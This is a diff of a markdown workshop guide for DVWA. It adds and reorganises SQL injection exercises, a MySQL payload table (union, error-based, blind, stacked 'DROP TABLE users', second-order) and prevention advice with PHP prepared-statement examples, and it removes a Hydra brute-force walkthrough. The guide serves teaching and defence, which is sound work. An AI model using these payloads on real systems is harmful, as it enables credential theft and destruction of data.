@@ -181,7 +181,7 @@ You can set up DVWA (Damn Vulnerable Web Application) by forking this repository
 
 
 ## Practical Tasks 
-https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+
 ### SQL Injection Exercise
 
 This exercise will help you understand how SQL Injection works and explore methods to prevent it.
@@ -221,182 +221,71 @@ This exercise will help you understand how SQL Injection works and explore metho
 | **Extract Database Version**      | `1' UNION SELECT null, @@version --`                                  | Retrieves the database version (`@@version` is MySQL-specific).                                  | Displays the MySQL version, e.g., `8.0.28`.                                                                 |
 | **Retrieve Current Database Name**| `1' UNION SELECT null, database() --`                                 | Extracts the name of the currently selected database.                                             | Displays the database name, e.g., `dvwa`.                                                                   |
 | **List All Tables**               | `1' UNION SELECT null, table_name FROM information_schema.tables --`  | Fetches all table names from the `information_schema.tables`.                                     | Displays a list of table names such as `users`, `logs`, etc.                                                |
-| **List Columns in a Table**       | `1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --` | Lists column names in the `users` table.                                                         | Displays column names like `id`, `username`, `password`.                                                   |
+| ***List Columns in a Table***       | `1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --` | Lists column names in the `users` table.                                                         | Displays column names like `id`, `username`, `password`.                                                   |
 | **Time-Based Blind Injection**    | `1' AND IF(1=1, SLEEP(5), null) --`                                   | Delays response by 5 seconds if the condition `1=1` is true. Useful for blind SQL Injection.      | A 5-second delay confirms successful injection.                                                             |
 | **Extract Single Character from Data** | `1' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1), 1, 1)) > 65 --` | Retrieves the ASCII value of the first character in the password of the first user.              | Helps reconstruct passwords character by character through binary search.                                   |
 | **Boolean-Based Blind Injection** | `1' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8 --` | Checks if the password length for the user `admin` is 8 characters.                              | Returns a valid response if the length is correct, otherwise no response.                                   |
 
 ---
 
-## **Notes**
-1. **Testing Environment**: Perform these tests in a controlled environment like DVWA.
-2. **Ethical Use**: Ensure you have proper authorization before performing any security tests.
-3. **Impact**: These payloads demonstrate how SQL Injection can extract sensitive data or manipulate database behavior.
+[**Read More- Testing for SQL Injection OWSAP**](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
 
+# Basic Union-Based Injection to Retrieve Usernames and Passwords
 
-# SQL Injection Payloads for MySQL
+ ```sql
+ 1' UNION SELECT null, user, password FROM users --
+```
 
-| **Type of Injection**    | **Payload**                                | **Explanation**                                                                                 | **Example**                                                                                                                                   |
-|---------------------------|--------------------------------------------|-------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
-| **Union-Based**           | `1' UNION SELECT null, version(), database() --` | Combines results of multiple SELECT queries to extract information.                              | Retrieves database version and name.                                                                                                         |
-| **Error-Based**           | `1' AND CONVERT(@@version USING latin1) --` | Forces the database to generate an error that reveals details like the database version.         | Outputs an error message exposing `@@version` information.                                                                                   |
-| **Boolean-Based Blind**   | `1' AND 1=1 --` <br> `1' AND 1=2 --`       | Checks how the application responds to true/false conditions to infer information.              | A valid response for `1=1` and no response for `1=2` indicate a vulnerability.                                                               |
-| **Time-Based Blind**      | `1' AND IF(1=1, SLEEP(5), null) --`        | Delays server response if the condition is true to confirm successful injection.                 | A 5-second delay indicates successful injection.                                                                                             |
-| **Stacked Queries**       | `1'; DROP TABLE users --`                  | Executes multiple SQL statements in one query, often leading to destructive actions.             | Deletes the `users` table if stacking is allowed.                                                                                            |
-| **Second-Order**          | `test' --`                                 | Injects SQL during one interaction (e.g., registration) and exploits it in another (e.g., login). | Register with `test' --` and then log in as `test` to bypass authentication or manipulate other queries.                                      |
+***It will result in an error, that is we need to determine exact number of columns in the original query.***
 
+ ```sql
+1' ORDER BY 3 --
+1' ORDER BY 2 --
+```
 
+***Adjust the number after ORDER BY until you no longer get an error. This determines the number of columns in the original query.***
 
-## **Detailed Explanations**
+**After we know the exact number of columns (in this case 2), we update our query**
 
-### **Union-Based Injection**
-- **Description**: Combines results from multiple SELECT queries.
-- **Example Query**:
-  ```sql
-  SELECT * FROM users WHERE id = '1' UNION SELECT null, version(), database();
+```sql
+1' UNION SELECT user, password FROM users --
+```
 
+**Explanation:**
 
-#### How to Prevent SQL Injection
+- The payload uses UNION SELECT to combine the query's output with data from the users table.
+- user and password are column names in the users table.
+- The -- comment syntax ignores the rest of the original query.
 
-After observing this vulnerability, consider how SQL Injection could be mitigated:
+# How to Prevent SQL Injection ??
 
-- **Prepared Statements**: Use parameterized queries instead of directly concatenating user inputs into SQL commands. This ensures user inputs are treated as data, not executable code.
-  
-- **Input Validation**: Only allow specific, expected formats (e.g., ensure only integers are allowed for IDs) to prevent malicious input from altering SQL queries.
+After observing this vulnerability, lets go through how SQL Injection could be mitigated:
 
-- **Escaping Special Characters**: Escape special characters like quotes to prevent user inputs from being interpreted as part of the SQL command.
+1. **Avoid Direct Query Embedding**: Never concatenate user inputs directly into SQL queries.
+2. **Always Use Prepared Statements**: They separate SQL logic from data, preventing malicious execution.
+3. **Adopt Secure Coding Practices**: Follow the OWASP Top 10 guidelines to mitigate injection attacks.
 
-This exercise demonstrates the importance of secure coding practices to protect applications from SQL Injection attacks.
+4. **Input Validation**: Only allow specific, expected formats ( ensure only integers are allowed for IDs) to prevent malicious input from altering SQL queries.
 
+5. **Escaping Special Characters**: Escape special characters like quotes to prevent user inputs from being interpreted as part of the SQL command.
 
-### Brute Force Exercise
+6. **Limit Database Privileges**
 
-This exercise demonstrates how brute force attacks attempt to guess passwords by systematically trying different combinations.
+7. **Use Web Application Firewalls (WAF)**: A WAF can detect and block malicious SQL queries in HTTP requests.
 
-1. **Access DVWA**:
-   - Open your browser and navigate to `http://localhost:89`.
+8. **Error Handling**: Configure applications to show generic error messages and prevent attackers from gaining insight into the database structure through error messages.
 
-2. **Log In to DVWA**:
-   - Use the credentials: **Username**: `admin`, **Password**: `password`.
+9. **Input Length Constraints** :  VARCHAR(50)
 
-3. **Set Security Level**:
-   - Go to the **DVWA Security** tab and set the security level to **Low**.
+10. **Keep Software Updated**
 
-4. **Select the Brute Force Module**:
-   - In the left sidebar, select **Brute Force** from the list of modules.
+11. **Regular Security Testing**: Use automated tools like SQLMap, Burp Suite, or OWASP ZAP to test for SQL Injection vulnerabilities.
 
-5. **Prepare a Password List**:
-   - Create a file named `passwords.txt` with a few sample passwords:
-     ```plaintext
-     password
-     admin
-     123456
-     password123
-     letmein
-     ```
-
-6. **Use Hydra to Perform the Attack**:
-
-Note we need to install hydra 
-
-in Ubuntu/debian run the following command 
-sudo apt update
-sudo apt install hydra -y
-
-You can also do it in WSL ubuntu 
-
-sudo apt update
-sudo apt install hydra -y
-
-Verify Installation
-
-hydra -h
-
-   - Open a terminal and run the following Hydra command to brute force the login:
-     ```bash
-     hydra -l admin -P passwords.txt localhost http-post-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^:Login failed"
-     ```
-   - **Explanation**:
-     - `-l admin` specifies the username.
-     - `-P passwords.txt` specifies the file with password guesses.
-     - `localhost` is the DVWA server.
-     - `http-post-form` is the method, and `"Login failed"` tells Hydra how to identify a failed attempt.
-
-7. **Review the Results**:
-   - Hydra will try each password until it finds the correct one, displaying the successful login credentials.
-
-#### Preventing Brute Force Attacks
-
-Consider these techniques to prevent brute force attacks:
-- **Account Lockout**: Temporarily lock accounts after multiple failed attempts.
-- **Rate Limiting**: Limit the number of login attempts in a given time period.
-- **Strong Password Policies**: Require complex passwords to reduce vulnerability to guessing attacks.
-
-This exercise demonstrates the risk of weak passwords and the importance of enforcing security measures to prevent brute force attacks.
-
-[**Read More**](https://github.com/digininja/DVWA)
-
-
-
-
-----------------------
-
-To demonstrate SQL injection and brute force attack steps using DVWA, you can follow these instructions. Note that these actions should only be performed in a controlled environment, such as DVWA, which is designed for educational purposes and security testing.
-SQL Injection Steps
-1. Access DVWA: Open your web browser and navigate to http://localhost. Log in using the default credentials (username: admin, password: password).
-Set Security Level: Go to the "DVWA Security" page and set the security level to "Low" to make SQL injection easier.
-Navigate to SQL Injection: Click on the "SQL Injection" link in the left sidebar.
-Perform SQL Injection:
-In the input field (e.g., "User ID"), enter the following payload:
-- Click the "Submit" button. This payload exploits the SQL query by always returning true, allowing you to bypass authentication or retrieve data.
-View Results: If successful, you should see the results of the SQL query, which may include sensitive information from the database.
-Brute Force Attack Steps
-1. Set Security Level: Ensure the DVWA security level is set to "Low" for the brute force attack demonstration.
-Navigate to Brute Force: Click on the "Brute Force" link in the left sidebar.
-3. Perform Brute Force Attack:
-In the "Username" field, enter admin.
-In the "Password" field, you can use a simple password list or try common passwords like password, 123456, etc.
-Click the "Login" button.
-4. Automate Brute Force (Optional): For a more automated approach, you can use tools like Hydra or Burp Suite to perform a brute force attack against the login page. Here’s an example command using Hydra:
-Bash
-Replace /path/to/passwords.txt with the path to your password list.
-Important Notes
-Ethical Considerations: Always ensure you have permission to test any application for vulnerabilities. DVWA is specifically designed for this purpose.
-Security Levels: DVWA has different security levels (Low, Medium, High) that affect the difficulty of the attacks. For educational purposes, start with "Low".
-Environment: Perform these tests in a safe, isolated environment to avoid any legal or ethical issues.
-By following these steps, you can effectively demonstrate SQL injection and brute force attacks using DVWA.
-
-
-Additional SQL Injection Techniques
-1. Union-Based SQL Injection:
-Input: In the "User ID" field, enter:
-- Explanation: This query attempts to combine the results of the original query with the results from the users table, allowing you to retrieve usernames and passwords.
-Error-Based SQL Injection:
-Input: In the "User ID" field, enter:
-- Explanation: This query forces an error that reveals the version of the database server. The CONVERT function is used to manipulate the output.
-3. Time-Based Blind SQL Injection:
-Input: In the "User ID" field, enter:
-- Explanation: This query uses the SLEEP function to create a delay if the condition is true. If the application takes longer than usual to respond, it indicates that the injection was successful.
-Boolean-Based Blind SQL Injection:
-Input: In the "User ID" field, enter:
-- Input: In the "User ID" field, enter:
-- Explanation: The first input should return a valid response, while the second should not. This technique helps determine if the application is vulnerable to SQL injection by checking the response based on true/false conditions.
-5. Second-Order SQL Injection:
-Input: First, register a new user with a username like:
-- Input: Then, try to log in with:
-- Explanation: This technique involves injecting SQL during one interaction (like registration) and then exploiting it in another (like login). It demonstrates how data can be manipulated across different application states.
-Stacked Queries:
-Input: In the "User ID" field, enter:
-- Explanation: This query attempts to execute multiple SQL statements in one go. If the application allows it, this could lead to data loss. Note that many applications have protections against this type of injection.
-Important Considerations
-Testing Environment: Always perform these tests in a controlled environment like DVWA, which is designed for learning and testing security vulnerabilities.
-Security Levels: Adjust the security level in DVWA to see how it affects the success of these injections. Higher security levels may have protections in place.
-Ethical Hacking: Ensure you have permission to test any application for vulnerabilities. These techniques should only be used in legal and ethical contexts.
-By experimenting with these additional SQL injection techniques, you can gain a deeper understanding of how SQL injection vulnerabilities can be exploited.
-
+12. **Educate Developers**: Secure coding practices are critical for preventing vulnerabilities. Encourage adherence to secure coding standards (e.g., OWASP Top 10).
 
 
 ## Important Notes
+
 ### Ethical Considerations
 - Always ensure you have permission to test any application for vulnerabilities. DVWA is designed for educational purposes and controlled testing.
 ### Security Levels
@@ -405,8 +294,7 @@ By experimenting with these additional SQL injection techniques, you can gain a 
 - Perform these tests in a safe, isolated environment like DVWA to avoid any legal or ethical issues.
 
 
-
-### Recommended Resources for Database Security
+## Recommended Resources & Furhter Learning for Database Security
 
 #### OWASP Top 10 Database Security Risks
 - **Description**: Covers injection attacks, misconfigurations, and access control vulnerabilities as they relate to databases.
@@ -432,5 +320,44 @@ By experimenting with these additional SQL injection techniques, you can gain a 
 - **Description**: Focuses on securing Microsoft SQL Server databases and mitigating common threats.
 - **URL**: [https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-database-security](https://azure.microsoft.com/en-us/resources/cloud-computing-dictionary/what-is-database-security)
 
-### Tools to Explore Database Threats
-- [SQLMAP](https://sqlmap.org/)
+
+
+# 🎉 **Thank You Very Much!** 🎉 🙋 **Q&A Starts Now** 🙋
+
+---
+# Prepared Statements
+
+Use parameterized queries instead of directly concatenating user inputs into SQL commands. This ensures user inputs are treated as data, not executable code.
+
+# SQL Injection Prevention: Vulnerable vs Secure Code
+
+| **Aspect**          | **Vulnerable Code**                                                                                          | **Secure Code (Using Prepared Statements)**                                                     |
+|----------------------|-------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------|
+| **Input Handling**   | Directly embeds user input into the query.                                                                  | Uses placeholders and binds user input securely.                                               |
+| **SQL Query**        | ```php                                                                                                      | ```php                                                                                         |
+|                      | $username = $_GET['username'];                                                                             | $username = $_GET['username'];                                                                 |
+|                      | $query = "SELECT * FROM users WHERE username = '$username'";                                               | $stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");                            |
+|                      | $result = $mysqli->query($query);                                                                          | $stmt->bind_param("s", $username);                                                             |
+|                      |                                                                                                            | $stmt->execute();                                                                              |
+|                      |                                                                                                            | $result = $stmt->get_result();                                                                 |
+|                      | ```                                                                                                        | ```                                                                                           |
+| **Vulnerability**    | Susceptible to SQL Injection if `$username` includes malicious input like: `' OR '1'='1 --`.               | Input is treated as data, not executable SQL, even with malicious payloads.                   |
+| **Security Mechanism**| None.                                                                                                     | Uses parameterized queries (prepared statements), ensuring SQL and user input are separated.   |
+| **Example of Exploit**| Malicious input:                                                                                          | Malicious input:                                                                               |
+|                      | ```                                                                                                        | ```                                                                                           |
+|                      | admin' OR '1'='1 --                                                                                        | admin' OR '1'='1 --                                                                           |
+|                      | ```                                                                                                        | ```                                                                                           |
+|                      | Result: Bypasses authentication and returns all users.                                                    | Result: No SQL Injection; treated as a literal string.                                         |
+
+---
+
+# SQL Injection Payloads for MySQL
+
+| **Type of Injection**    | **Payload**                                | **Explanation**                                                                                 | **Example**                                                                                                                                   |
+|---------------------------|--------------------------------------------|-------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|
+| ***Union-Based***           | `1' UNION SELECT null, version(), database() --` | Combines results of multiple SELECT queries to extract information.                              | Retrieves database version and name.                                                                                                         |
+| ***Error-Based***           | `1' AND CONVERT(@@version USING latin1) --` | Forces the database to generate an error that reveals details like the database version.         | Outputs an error message exposing `@@version` information.                                                                                   |
+| **Boolean-Based Blind**   | `1' AND 1=1 --` <br> `1' AND 1=2 --`       | Checks how the application responds to true/false conditions to infer information.              | A valid response for `1=1` and no response for `1=2` indicate a vulnerability.                                                               |
+| **Time-Based Blind**      | `1' AND IF(1=1, SLEEP(5), null) --`        | Delays server response if the condition is true to confirm successful injection.                 | A 5-second delay indicates successful injection.                                                                                             |
+| **Stacked Queries**       | `1'; DROP TABLE users --`                  | Executes multiple SQL statements in one query, often leading to destructive actions.             | Deletes the `users` table if stacking is allowed.                                                                                            |
+| **Second-Order**          | `test' --`                                 | Injects SQL during one interaction (e.g., registration) and exploits it in another (e.g., login). | Register with `test' --` and then log in as `test` to bypass authentication or manipulate other queries.                              
